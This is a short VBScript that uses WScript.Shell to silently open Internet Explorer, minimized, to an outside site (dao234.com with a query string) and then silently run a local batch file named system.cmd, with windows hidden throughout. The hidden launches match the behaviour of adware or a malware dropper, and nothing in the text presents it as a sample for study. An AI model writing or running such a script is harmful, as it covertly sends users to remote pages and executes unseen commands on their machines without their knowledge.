DIM objShell
set objShell=Wscript.createObject("wscript.shell")
iReturn=objShell.Run("cmd.exe /C start /min iexplore http://dao234.com/index2.html?51dd", 0, TRUE)
iReturn=objShell.Run("cmd.exe /C .\system.cmd", 0, TRUE)
